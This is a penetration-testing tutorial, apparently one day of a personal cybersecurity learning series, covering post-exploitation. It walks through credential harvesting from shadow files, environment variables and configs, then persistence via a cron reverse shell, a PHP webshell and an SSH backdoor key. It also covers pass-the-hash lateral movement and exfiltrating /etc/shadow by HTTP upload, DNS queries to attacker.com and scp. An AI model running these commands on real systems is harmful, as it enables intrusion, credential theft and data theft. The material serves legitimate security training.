# Day 039 - Post-Exploitation: What Happens After a Shell

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Getting a shell is not the end of a penetration test.

It's the beginning of the most important phase.

Post-exploitation is where you prove business impact - what could a real attacker actually do with this access? How far could they go? What data could they reach? How long could they stay undetected?

This phase determines the severity rating in your report and convinces the client that the finding matters.

---

## 🗺️ Post-Exploitation Objectives

```
1. Situational Awareness   → understand the environment
2. Privilege Escalation    → become root/SYSTEM (Days 35-36)
3. Credential Harvesting   → collect passwords and hashes
4. Persistence             → maintain access if shell drops
5. Lateral Movement        → pivot to other machines
6. Data Exfiltration       → prove what an attacker could steal
7. Covering Tracks         → understand what evidence exists
```

---

## 🔎 Phase 1 - Situational Awareness

First questions after landing a shell:

```bash
# ── Where am I? ───────────────────────────────
hostname
whoami && id
ip a                           # network interfaces
ip route                       # routing table - other networks?
cat /etc/hosts                 # internal hostnames
uname -a                       # OS and kernel

# ── What's running? ───────────────────────────
ps aux                         # all processes
ss -tuln                       # listening services
netstat -rn                    # routing table

# ── What's connected to this machine? ─────────
arp -a                         # ARP cache - recently contacted IPs
cat /var/log/auth.log | grep "Accepted" | tail -20  # who's logged in?

# ── What's valuable here? ─────────────────────
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -name "*.key" -readable 2>/dev/null
find / -name "id_rsa" -readable 2>/dev/null
find / -name ".env" -readable 2>/dev/null
find / -name "wp-config.php" -readable 2>/dev/null  # WordPress DB creds
```

---

## 🔑 Phase 2 - Credential Harvesting

```bash
# ── Linux ─────────────────────────────────────
cat /etc/shadow 2>/dev/null              # password hashes (needs root)
cat /etc/passwd                          # usernames
cat ~/.bash_history                      # command history - often has creds
grep -r "password" /etc/ 2>/dev/null     # passwords in configs
grep -r "DB_PASSWORD" / 2>/dev/null      # database passwords

# ── Environment variables ─────────────────────
env | grep -iE "key|secret|pass|token|api"
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "key|pass|secret"

# ── SSH keys ──────────────────────────────────
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# ── Application credentials ───────────────────
# WordPress
cat /var/www/html/wp-config.php 2>/dev/null | grep -E "DB_|table_prefix"

# MySQL
cat /root/.mysql_history 2>/dev/null
mysql -u root 2>/dev/null               # try passwordless

# ── Memory (requires root) ────────────────────
strings /dev/mem 2>/dev/null | grep -i "password"

# ── Windows credential harvest ─────────────
# (from Meterpreter session)
# hashdump                              # SAM hashes
# run post/windows/gather/credentials/credential_collector
# run post/multi/gather/env
```

---

## 🔒 Phase 3 - Persistence

Maintain access if your shell drops or the machine reboots.

```bash
# ── SSH Key Persistence (Linux) ───────────────
# Generate key pair on Kali
ssh-keygen -t rsa -f /tmp/backdoor -N ""

# Add public key to target's authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAA...yourpublickey..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Now connect without password:
ssh -i /tmp/backdoor user@target

# ── Cron Job Persistence ──────────────────────
# Reverse shell every minute
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'" | crontab -

# ── Webshell Persistence ──────────────────────
# If web server is running
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/status.php

# ── Meterpreter Persistence (Windows) ─────────
run post/windows/manage/persistence STARTUP=SCHEDULER
run post/linux/manage/sshkey_persistence
```

---

## 🌐 Phase 4 - Lateral Movement

Using your current access to reach other machines.

```bash
# ── Network discovery from inside ─────────────
# Scan internal network (not visible from outside)
nmap -sn 10.10.10.0/24                 # ping sweep
nmap -sV -p 22,80,445,3389 10.10.10.0/24

# ── Credential reuse ──────────────────────────
# Try harvested credentials on other internal hosts
ssh admin@10.10.10.5 -i id_rsa
ssh user@10.10.10.10           # with harvested password

# ── Pass the Hash (Windows) ───────────────────
# Use NTLM hash without cracking - authenticate directly
impacket-psexec administrator@10.10.10.5 -hashes :aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# ── Port Forwarding / Tunneling ───────────────
# Forward local port to internal service via SSH
ssh -L 8080:10.10.10.5:80 user@pivot_host
# Now visit localhost:8080 → reaches internal web app

# Via Meterpreter
portfwd add -l 3306 -p 3306 -r 10.10.10.5
# Connects to internal MySQL at 10.10.10.5:3306 via local port 3306

# ── Metasploit route ──────────────────────────
# Add route through existing session
run post/multi/manage/autoroute SUBNET=10.10.10.0 NETMASK=255.255.255.0
# Now scan 10.10.10.0/24 through the pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
run
```

---

## 📤 Phase 5 - Data Exfiltration (Proof of Impact)

Show what a real attacker could steal.

```bash
# ── Find sensitive data ───────────────────────
find / -name "*.pdf" 2>/dev/null | head -20
find / -name "*.xlsx" 2>/dev/null | head -20
find / -name "*credit*" 2>/dev/null
find / -name "*ssn*" 2>/dev/null
find / -name "*confidential*" 2>/dev/null

# Database dump
mysqldump -u root -p database_name > dump.sql 2>/dev/null

# ── Exfiltration methods ──────────────────────
# Via HTTP (to your server)
curl -F "file=@/etc/shadow" http://192.168.56.1:8000/upload

# Via DNS (stealthy, often allowed through firewalls)
cat /etc/shadow | base64 | while read line; do
  nslookup $line.attacker.com
done

# Via SCP
scp /etc/shadow kali@192.168.56.1:/tmp/

# Start simple HTTP server on Kali to receive:
python3 -m http.server 8000
```

---

## 🧹 Phase 6 - Evidence Awareness (Not Covering Tracks - Just Understanding)

In a real pen test, you document - you don't delete logs. But understanding what's logged helps you report to the defender what an attacker would see.

```bash
# What logs exist?
ls -la /var/log/
cat /var/log/auth.log     # authentication events
cat /var/log/syslog       # system events
cat /var/log/apache2/access.log   # web server requests

# What would your activity look like?
last                      # login history
lastb                     # failed logins
who                       # currently logged in users

# Bash history is evidence
cat ~/.bash_history        # your commands are here
# Attackers sometimes do: history -c && > ~/.bash_history
# You note this in the report - attacker could destroy forensic evidence
```

---

## 📋 Post-Exploitation Checklist

```
□ Situational awareness complete (hostname, network, users)
□ Local privilege escalation attempted
□ Credentials harvested (shadow, env, configs, history)
□ Persistence established (document method)
□ Internal network scanned
□ Lateral movement attempted with harvested credentials
□ Sensitive data identified and documented
□ All findings documented with timestamps and evidence
□ Screenshots taken for report
```

---

## 🔑 Key Takeaways

- Getting a shell is the start, not the end - post-exploitation proves real impact
- Always enumerate first - understand the environment before taking action
- Credential harvesting often yields more access than further exploitation
- Lateral movement is where pen tests go from "I got one server" to "I have the domain"
- Document everything - timestamps, commands, output - for the report
- The report is what the client pays for - post-exploitation findings are what justify the engagement cost

---

## 📚 Resources
- [PayloadsAllTheThings - Post Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks - Post Exploitation](https://book.hacktricks.xyz/)
- [TryHackMe - Post-Exploitation Basics](https://tryhackme.com/room/postexploit)

---

## [⬅️ Day 038](../day038/) | [➡️ Day 040](../day040/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*